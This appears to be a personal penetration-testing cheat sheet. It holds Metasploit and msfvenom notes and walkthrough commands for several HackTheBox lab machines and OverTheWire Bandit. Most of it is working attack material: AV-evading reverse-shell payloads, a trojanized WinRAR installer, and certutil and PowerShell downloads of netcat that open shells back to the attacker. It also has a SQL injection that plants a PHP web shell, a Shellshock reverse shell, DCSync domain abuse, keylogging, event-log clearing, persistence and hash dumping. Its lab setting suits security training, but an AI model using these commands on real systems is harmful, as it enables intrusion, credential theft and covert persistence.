        //Pay attention with the iterations
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 x86/shikata_ga_nai -f elf > encodedx86Linux

    Injecting payloads into Windows portable executables //To avoid AV detection
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > winrar.exe
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > winrar-new.exe //To mantain the original functioning. It will not work all times
      msfconsole -q 
        use multi/handler
        //Once we have a session.
          sysinfo
          run post/windows/manage/migrate 
    Automating Metasploit with resource scripts
      ls -al /usr/share/metasploit-framework/scripts/resource      
      vim handler.rc
        use multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp 
        set LHOST 10.10.10.5
        set LPORT 4126
        run
      msfconsole -r handler.rc
      //Another
      vim portscan.rc
        use auxiliary/scanner/portscan/tcp
        set RHOSTS 10.10.10.7
        run
      msfconsole -r portscan.rc
      //Other
      vim db_status.rc
        db_status
        workspace 
        workspace -a Test
      //Upload it directly from msfconsole
      msfconsole -q
        resource ~/Documents/handler.rc //Load a resource script
        //Save last commands with makerc
          [msf](Jobs:0 Agents:0) exploit(multi/handler) >> makerc ~/Desktop/ajgs/
          [*] Saving last 4 commands to ~/Desktop/ajgs/ ...
    Exploitation
      Windows Exploitation
        Exploiting a vulnerable HTTP file server
          > You can't host a website on the HTTP file server (For example: Rejetto HFS ==> Free and open source)
          service postgresql start
          msfconsole -q
            db_status
            workspace -a HFS
            db_nmap -sS -sV -O 10.2.23.159
            search type:exploit name:rejetto
            use exploit/windows/http/rejetto_hfs_exec
            set payload //It is necessary because if you don't specify the payload it may assign an x86 instead an x64
        Exploiting Apache Tomcat
          It is a free and open source Java servlet web server
          It is used to build and host dynamic websites and web applications based on the Java software platform
          It utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
          It runs on TCP port 8080 by default
          What's the difference between Apache and Apache Tomcat?
            > The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP
            > The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed by Java
          msfconsole -q
          //After using db_nmap
            services  //To check open ports
            search type:exploit tomcat_jsp
            use exploit/multi/http/tomcat_jstp_upload_bypass
              info
              set payload java/jsp_shell_bind_tcp
              set shell cmd
              //In another tab to migrate to a meterpreter shell
              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4126 -f exe > meterpreter.exe
              python3 -m http.server 80
              certutil -urlcache -f http://10.10.10.4/meterpreter.exe meterpreter.exe
            vim handler.rc
              use multi/handler 
              set PAYLOAD windows/meterpreter/reverse_tcp
              set LHOST 10.10.5.4
              set LPORT 4126
              run
            msfconsole -r handler.rc
  Linux Exploitation
    Exploiting a vulnerable FTP server
      vsftpd is the default FTP server for Ubuntu, CentOS and Fedora
      msfconsole -q 
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
    Exploiting Samba
      msfconsole -q
        use exploit/linux/samba/is_known_pipename
          check
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
          set LHOST eth1
    Exploiting a vulnerable SSH server
      libssh is a multiplataform C library implementing the SSHv2 protocol on client and server side
      use auxiliary/scanner/ssh/libssh_auth_bypass
        set spwan_pty true
          cat /etc/*release
    Exploiting SMTP
      Haraka is an open source high performance SMTP server developed in Node.js.
      > Haraka versions prior to 2.8.9 are vulnerable to command injection
      msfconsole -q
        use exploit/linux/smtp/haraka
        set SRVPORT 9898
        set email_to root@attackdefense.test 
        set payload linux/x64/meterpreter_reverse_http
        set LHOST eth1

  Post exploitation fundamentals
    Meterpreter fundamentals
      > The meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
      > It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
      sessions -C sysinfo -i 1 //Run a meterpreter command on a session
      sessions -n xodanamewhateveryoulike -i 1
      meterpreter>
        lpwd //Check present working directory on local(attacker) machine
        lls //List the files present in current directory of the local machine
        lcd //Change directory on the local machine
        cat flag
        edit flag 
        download flag5.zip /root/Desktop 
        checksum md5 /bin/bash
        getenv PATH
        getenv TERM
        search 
        search -d /usr/bin -f *backdoor*
        search -f *.jpg
        search -f *.php
        download flag1
        shell
          /bin/bash -i
        ps
        migrate 580
        migrate -N apache2
        execute -f ifconfig
    Upgrading command shells to meterpreter shells
      Using shell_to_meterpreter 
        use shell_to_meterpreter
          set session 1
          set lhost eth1
          sessions -l
      Or upgrade a commmand shell with the '-u' parameter
        sessions -u 1
    Windows Post exploitation modules
      meterpreter > 
        screenshot
        getsystem //Privesc
        hashdump
        show_mount //Drives or mounts 
        ps
        migrate 2212 //explorer.exe
      search migrate 
        use post/windows/manage/migrate
      search win_privs
        use post/windows/gater/win_privs
          set session 1
      search enum_logged_on
        use post/windows/gather/enum_logged_on_users  //Current and recently logged users
      search checkvm //To know if the target is a virtual machine
        use post/windows/gather/checkvm
      search enum_applications //Enum installed applications
        post/windows/gather/enum_applications 
      //Access the data gathered
        loot
      search type:post platform:windows enum_av
        post/windows/gather/enum_av_excluded 
      post/windows/gather/enum_computers 
      post/windows/gather/enum_patches
      post/windows/gather/enum_shares
      post/windows/manage/enable_rdp
    Bypassing UAC
      getuid
      getprivs 
      shell
        net users
        net localgroup administrators 
      use exploit/windows/local/bypassuac_injection 
        set payload windows/x64/meterpreter/reverse_tcp
        set target Windows\ x64 //If x86 target is selected
    Token Impersonation with Incognito
      load incognito
        list_tokens -u //User tokens
        impersonate_token "ATTACKDEFENSE\Administrator"
        migrate 3544 //explorer.exe. Esto lo hago porque se han quedado los access tokens cacheados
        hashdump
    Establishing persistence on windows
      use exploit/windows/local/persistence_service 
        set service_name badservice
        set payload windows/meterpreter/reverse_tcp
      //Once we have done this, we will have persistence
      use exploit/multi/handler
    Enabling RDP
      use post/windows/manage/enable_rdp
        net user administrator hacker_123! //Change administrator password
    Windows keylogging
      meterpreter >
        migrate 2460 //explorer.exe
        keyscan_start
        kesycan_dump
        keyscan_stop
    Clearing Windows Event Logs
      meterpreter > 
        clearev
    Pivoting
      meterpreter > 
        ipconfig //Copy the other IP 
        run autoroute -s 10.2.27.0/20 //-s = subnet //Only applicable to msfconsole
      use auxiliary/scanner/portscan/tcp
        set rhosts [IP victim 2]
      meterpreter > 
        portfwd add -l 1234 -p 80 -r 10.2.27.187
      db_nmap -sS -sv -p 1234 localhost 
      use exploit/windows/http/badblue_passthru
        set payload windows/meterpreter/bind_tcp
  Linux post exploitation modules
    meterpreter > 
      sysinfo
      getuid
      shell
        cat /etc/passwd
        groups root
        cat /etc/*issue
        uname -r 
        uname -a
        netstat -antp
        ps aux
        env
      post/linux/gather/enum_configs //Several interesting files
      post/linux/gather/enum_network
      post/linux/gather/enum_protections
      post/linux/gather/enum_system
      post/linux/gather/checkcontainer
      post/linux/gather/checkvm
      post/linux/gather/enum_users_history //Maybe some users have typed passwords in clear text
      post/linux/gather/hashdump
      post/linux/gather/ecryptfs_creds
      post/linux/gather/enum_psk
      post/linux/gather/enum_xchat
      post/linux/gather/phpmyadmin_credsteal
      post/linux/gather/pptpd_chap_secrets
      post/linux/manage/donwload_exec
      post/linux/manage/sshkey_persistence
      post/multi/gather/env //Enviromental variables 
      post/multi/gather/ssh_creds
      post/multi/gather/docker_creds
      post/multi/manage/system_session
        set type python
        set handler true
      > notes //system protections saved to notes
      > loot //Display the information gathered by a post exploitation module
    Exploiting a vulnerable application
      chkrootkit -v 
      use exploit/unix/local/chkrootkit
        set chkrootkit /bin/chkrootkit //The PATH of chkrootkit
    Dumping hashes with Hashdump
      use post/linux/gather/hashdump
    Establishing persistence on Linux
      Manually
        useradd -m /www/var/html/ftp -s /bin/bash
        passwd ftp
        groups root
        usermod -aG root ftp
        groups ftp
        usermod -u 15 ftp //Modify user ID
      use exploit/linux/local/cron_persistence
      use exploit/linux/local/service_persistence
        set payload cmd/unix/reverse_python
      post/linux/manage/sshkey_persistence
        set createsshfolder true
Exploitation
  Vulnerability scanning overview
    Banner grabing
      banner.nse
      nc 192.168.113.3 22
      ssh root@192.168.113.3 22 //May give you some information
    With Nmap scripts
      nmap -sV -p 80 --script=http-waf-detect 192.168.113.3
      ❯ ls -la /usr/share/nmap/scripts | grep shellshock
        nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.168.113.3
  Searching for publicly available exploits
    + Exploit-db
    + Rapid7
    + Packet strom
    + searchsploit
        ls -la /usr/share/exploitdb
        searchsploit -u //Update exploitdb
        searchsploit -t java #Por titulo
        searchsploit -p 39166 #Copia al portapapeles
        searchsploit -m 39166 #Ademas copia al directorio actual 
        searchsploit -x 39166 #Examinar
        searchsploit -x --nmap resultado.xml
        searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
        searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
        searchsploit -c ProFTPD 1.3.5 #Case sensitive
        searchsploit remote windows smb -w | grep -e "EternalBlue" //Show the URL
        searchsploit remote linux ssh
  Fixing Exploits
    cp /usr/share/windows-resources/binaries/nc.exe
  Cross-compiling exploits
    Cross-compiling is the process of compiling code for a platfrom other than the one performing the compilation
    In Windows
      apt-get install mingw-w64 gcc
      searchsploit -m 9303
      i686-w64-mingw32-gcc 9303.c -o exploit
      i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
    In Linux
      searchsploit -m 40839
      gcc -pthread 40839 -o exploit -lcrypt
    We could use the precompiled binaries from exploitdb
      https://gitlab.com/exploit-database/exploitdb-bin-sploits

-=-=-=-
CMS 
#Joomla
In /administrator/manifests/files/joomla.xml you could access a list of files inside the root folder, and version of Joomla.
In /language/en-GB/en-GB.xml you can get the version of Joomla.
->Scripts 
  https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
  https://github.com/OWASP/joomscan
-=-=
#Wordpress 

Under Appearance Editor 
  system shellexec exec passthru

#Automated
wpscan --url <> -o results_wpscan
wpscan --url <> -e vp,u #Enumerate vulnerable plugins and users

If we get a valid user 
wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --max-threads 50
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
Digital Forensics

pdfinfo #Shows various metadata related
-=-=
Photo EXIF Data

EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image files. Whenever you take a photo with your smartphone or with your digital camera, plenty of information gets embedded in the image. The following are examples of metadata that can be found in the original digital images:

    Camera model / Smartphone model
    Date and time of image capture
    Photo settings such as focal length, aperture, shutter speed, and ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS coordinates embedded in the image is highly probable. The GPS coordinates, i.e., latitude and longitude, would generally show the place where the photo was taken.

exiftool image.jp

steghide embed -ef '/root/secret.txt' -cf '/root/FatBird.jpg' -p password123
steghide extract -sf '/root/FatBird.jpg' -p password123 -xf '/root/secret.txt

display file.wav
play file.wav
-=-=-=-=-
MITRE

-=-=-=-=-=-=
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
Over the wire 
--> Bandit 
cat bandit0 == echo `cat bandit0` #It will replace the content
cat - # Refers to stdin
strings ./* or file ./*
find inhere/ -readable -size 1033c ! -perm /111 2>/dev/null
find / -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/
dev/null

gunzip 
bzip2 -> bunzip2
tar ---> tar xf 


cat /etc/bandit_pass/bandit14 | nc localhost 30000
curl -s -X GET localhost:30000 -u bandit14

ctrl u 
ctrl k 
ctrl d 
alt backspace 

-=-=-=-=
GIT 
git branch -a
git checkout [nameofthebranch]
git log "commit" | cut -d " " -f 2 | while read line; do git show $line;done| less
git grep password
git reflog
  What is difference between git log and Reflog?
  The biggest difference between Git reflog vs. log is that the log is a public accounting of the repository's commit history while the reflog is a private, workspace-specific accounting of the repo's local commits

git add key.txt
git commit
git push
#First example of doing git commits
jekyll serve
git add .
git commit -m "My first blog"
git push -u origin

git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
git status 
git add . 
git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
git push 

$0 
-=-=-=-=-
python 
#-*- coding: utf-8 -*-

-=-=-=--=
Testing things
Example on search page with PHP
  a /dev/null; cat /etc/passwd #
  . /etc/passwd #
-=-=-=-=-
Java 
gunzip a jar 
strings or javap -c <file>

-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
Machines
#Windows
$Silo
crapmapexec smb 10.129.95.188
smbclient -L 10.129.95.188 -N 
downloading odat github ==> after installing ==> sqlplus64 to test ==> python3 odat.py --help ==> ❯ python3 odat.py sidguesser -s 10.129.95.188 #to know valid sids ==> Use this dictionary /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt but change format to 'username/password'==> ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f exe -o malito.exe ==> ❯ python3 odat.py utlfile -s 10.129.95.188  -d XE -U 'scott' -P 'tiger' --putFile /Temp badcat.exe payload/malito.exe --sysdba ==> Exec this file and nc. ==> NT/authority system
-=-=-=-=-=-=
Lame
smbclient to list shares #If we have this problem we could use --option="client min protocol=NT1"   ❯ smbclient -L 10.129.122.21 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED==> ❯ smbclient -L //10.129.122.21 --option="client min protocol=NT1" #connect to tmp ==> ❯ smbclient -L \\10.129.122.21\tmp -N --option="client min protocol=NT1" -c "dir" ==> Search for an exploit to authenticate ==> We could use find ==> find / -type f \( -name "user.txt" -o -name "root.txt" \) | xargs cat
-=-=-=-=-=-=
Forest
dig axfr  @10.10.10.161 htb.local ==> Initial enumeration with rpc client ==> enumdomusers, enumdomgroups, querygroup 0x200 , querygroupmem 0x200, queryuser 0xf14 crackmapexec smb 10.129.69.58 ==> rpcclient -U "" 10.129.69.58 -N -c "enumdomusers" #Check if you can get a TGT (dont require pre auth) ==> ❯ rpcclient -U "" 10.129.69.58 -N  -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > ../content/users.txt ==>  impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt ==> Check if credentials are valid with ❯ crackmapexec smb 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If we have a + the creds are valid. If Pwned we could connect with PSexec to an interactive shell ==> Check if you can get a TGS with ❯ GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.129.69.58 -dc-ip 10.129.69.58 2>/dev/null ==> ❯ sudo ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.69.58 #If not valid credentials try this. service apache2 start and in browser localhost/ ==> If there is nothing interest, check again credentials with ❯ crackmapexec winrm 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If Pwn3d!  get evil-winrm with ❯ gem install evil-winrm ==> ❯ evil-winrm -i 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' ==> 
impacket-smbserver share . -smb2support -username df -password df ==> [victim machine] net use \\10.129.9.233\share /u:df df ==> net use /d \\10.10.14.72\share 
[Privilege escalation] ==> Use bloodhound with apt install neo4j bloodhound -y ==> neo4j console #Maybe you need to change java version to 11 ❯ sudo update-alternatives --config java ==> ❯ bloodhound &> /dev/null & ; disown ==> If you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4j ==> You need a recollector for Bloodhound like SharpHound.ps1 from puckiestyle; wget it in raw and from evil-winrm upload SharpHound.ps1 ==> import-module .\SharpHound.ps1 ==> We could check for what we want cat SharpHound.ps1 | grep "Invoke-BloodHound" and PS C:\> Invoke-BloodHound -CollectionMethod All ==> download this zip and import it with upload data in bloodhound ==> 
#Abusing account operators ==> net user ajgs ajgs123$! /add /domain ==> Abusing *Exchange Windows Permissions* Group with net group "Exchange Windows Permissions" ajgs /add ==> Check it with net user ajgs ==>  Do you obtain some hash with impacket-secretsdump htb.local/ajgs@10.129.69.58 ? ==> Import powerview.ps1 and finally Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ajgs -Rights DCSync ==> impacket-secretsdump svc-alfresco:s3rvice@10.129.9.233 ==> evil-winrm -i 10.129.69.58 -u 'Administrator' -H '<HASH>' 
#As last step, we could check schtasks /query /fo TABLE and schstasks /query /tn restore /v /fo list the issue with the service
#Alternative Tool: Aclpwm (https://github.com/fox-it/aclpwn.py) ==> aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161)
#Alternative Tool when we obtain the hashes ==>  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.129.9.233
#I had to run this to use secretdsump ==> *Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
-=-=-=
Fuse
[+] Test scan ports ==> timeout 1 bash -c "echo '' > /dev/tcp/10.129.2.5/81" #If it is open echo $? = 0 #Check https://www.thegeekstuff.com/2011/01/tput-command-examples/
[+] smbmap -H 10.129.2.5 -u null
[+] ldapsearch -h 10.129.2.5 -x -s base namingcontexts && ldapsearch -h 10.129.2.5 -x -b "DC=fabricorp,DC=local"
[+] ❯ impacket-GetNPUsers fabricorp.local/ -no-pass -usersfile users.txt
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p users.txt
[+] ❯ cewl -w passwords http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers #Because I didn’t specify a --depth, it will go two links away from the root page, which should be enough to get everything I want.
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p passwords --continue-on-success | grep -vi "failure"
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'Fabricorp01' #If password needs to be changed ==> smbpasswd -r 10.129.2.5 -U 'bhult'
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'hola123.'
[+] ❯ rpcclient -U 'bhult%hola123.' 10.129.2.5 ==> enumprinters 
[+] ❯ cat new_users_rpc.txt | tr ':' ' ' | awk '{print $2}' | tr -d '[]' OR ❯ cat new_users_rpc.txt  | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
[+] ❯ crackmapexec winrm 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1' #If pwned ...
[+] ❯ evil-winrm -i 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1'
[+] get-childitem -Path c:\users\svc-print -filter user.txt -recurse -erroraction silentlycontinue -force OR get-childitem -path c:\Users -filter user.txt -recurse -erroraction silentlycontinue -force | %{$_.fullname}
Windows Privilege Escalation ==> whoami /priv | whoami /all ==> Exploiting SeLoadDriverPrivilege
https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
1. Open Visual Studio 2022 ==> Console App ; Name of the project = LoadDriver ==> Paste the real code and Release | x64 | Rebuild Solution ==> Copy the LoadDriver.exe into Fuse\CompiledBinaries 
2. Download capcom.sys # A vulnerable driver ==> https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys into Fuse\CompiledBinaries
3. Change in ExploitCapcom.cpp when launch a command shell process ==>  Use applocker bypass (i.e. C:\Windows\System32\spool\drivers\color\malisimashell.exe) ==> Rebuild Solution ==> Fuse\CompiledBinaries
4. python -m http.server 9090 in machine windows
5. Create a reverse shell with msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4126 -f exe -o reverse.exe
6. Upload capcom.sys, LoadDriver.exe and ExploitCapcom.exe in c:\windows\temp BUT reverse.exe in C:\Windows\System32\spool\drivers\color 
7. C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\loquesea C:\Windows\Temp\Capcom.sys
8. C:\Windows\Temp\ExploitCapcom.exe
#https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

-=-=-=-=-=
Omni
❯ curl -s -X GET http://10.129.2.27:8080 -I #
[+] https://github.com/SafeBreach-Labs/SirepRAT ==> sudo python3 setup.py install ==> pip3 install -r requirements.txt
❯ python3 SirepRAT.py 10.129.2.27 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --vv
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c ping 10.10.14.31" --v
[+] Move netcat to Windows machine ==> https://github.com/vinsworldcom/NetCat64/releases 
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c certutil.exe -f -urlcache -split http://10.10.14.31/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c iwr -uri http://10.10.14.31/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.31 4126" --v
#Windows Privilege escalation 
[+] echo %USERNAME% ==> dir /r /s user.txt 
[+] (Import-CliXml -Path user.txt).GetNetworkCredential().password ==> icacls user.txt
[+] reg save HKLM\system system.backup ==>  reg save HKLM\sam sam.backup #If you want to list shares ==>  get-WmiObject -class Win32_Share -computer dc1.krypted.com
[+] You need to take those 2 files. In victim machine dir \\10.129.69.228\smbFolder . The best option is to use credentials. 
In victim machine ==> net use x: \\10.10.14.31\smbFolder /user:milo milo ==> In our machine impacket-smbserver share $(pwd) -smb2support -username milo -password milo
[+] Ways to see cmd history ==> doskey /history ==> F7 ==> F8 last command ==> 
[+] Clear cmd history ==> Close cmd ==> Alt + F7 
[+] dir \\10.10.14.31\smbFolder ==> copy sam.backup y:\sam ==> copy system.backup y:\system
❯ secretsdump.py  -sam sam -system system LOCAL 
❯ john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
-=-=-=-=-==
#Cascade
[+] git clone https://github.com/ropnop/kerbrute ==> go build -ldflags "-s -w" ==> upx kerbrute ==> du -hc kerbrute
[+] ❯ crackmapexec smb 10.129.64.195
[+] ❯ ./kerbrute userenum --dc 10.129.64.195 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
[+] ❯ rpcclient -U "" 10.129.64.195 -N ==> https://github.com/s4vitar/rpcenum
[+] ❯ impacket-GetNPUsers cascade.local/ -no-pass -usersfile users.txt
[+] ❯ smbclient -L //10.129.64.195 and ❯ smbmap -H 10.129.64.195
[+] ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" #We could search for usernames 
[+] ❯ ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 20 ==> cascadeLegacyPwd: clk0bjVldmE= 
[+] ❯ crackmapexec smb 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva' #Check if valid credentials
[+] ❯ rpcclient -U "" 10.129.64.195 -N -c "queryuser r.thompson"
1:24:47
[+] ❯ crackmapexec winrm 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva'
[+] ❯ sudo mount -t cifs //10.129.64.195/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
[+] ❯ cat IT/Email\ Archives/Meeting_Notes_June_2018.html | html2text
[+] ❯ cat password | tr -d ',' | xxd -ps -r #Hexadecimal to normal output. It seems to be encrypted ==> https://github.com/jeroennijhof/vncpwd ==> make && make install ==> upx vncpwd
[+] ❯ ./vncpwd ../password
[+] ❯ crackmapexec smb 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ crackmapexec winrm 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ evil-winrm -i 10.129.64.195 -u 's.smith' -p 'sT333ve2'
[+] ❯ smbclient  //10.129.64.195/Audit$ -U "s.smith%sT333ve2"
[+] sqlite3 Audit.db ==> .tables
[+] dotPeek



-----------------------------------------------------------------------
LINUX

-=================================================================
#Linux
JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==> #For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-==
Beep
searchsploit elastix ==> Try /etc/passwd, /etc/pam.d/passwd, /etc/pam.d/system-auth, /etc/fail2ban/fail2ban.conf/, /proc/self/environ #If we have access to User Agent we could change it (burpsuite) like <?php echo "hello"; ?>  , /proc/net/fib_trie 
[+] /proc/self/status chech the Uid and Gid for compare with /etc/passwd to see whoami
[+] /proc/net/tcp > data.txt ==> cat data  | tr ':' ' '  | awk '{print $3}' | sort  -u ==> python3 0x + port in hexadecimal format --> /proc/sched_debug or /proc/schedstat #Nothing interest
[+] In https://10.129.16.160:10000/session_login.cgi?logout=1 we could try shellsock agent for cgi. ==> With burp in user agent () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.72/4126 0>&1'
[+] Access to root directly ==> ❯ ssh root@10.129.16.160 -p 22 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
[+] Another commands ==> curl -k URL -o file #-k to ignore cert warning ==> g/nologin/d ==> grep -R return_application_language
[+] With SMTP opened we could send an email to a user ==> telnet 10.129.68.60 25 ==> EHLO loquesea.beep.htb ==> VRFY user@localhost ==> mail from:correomalisimo@quepenadas.io ==> rcpt to: asterisk@localhost ==> data ==> 
Subject: No esperes random
<?php echo system($_REQUEST['milo']); ?>
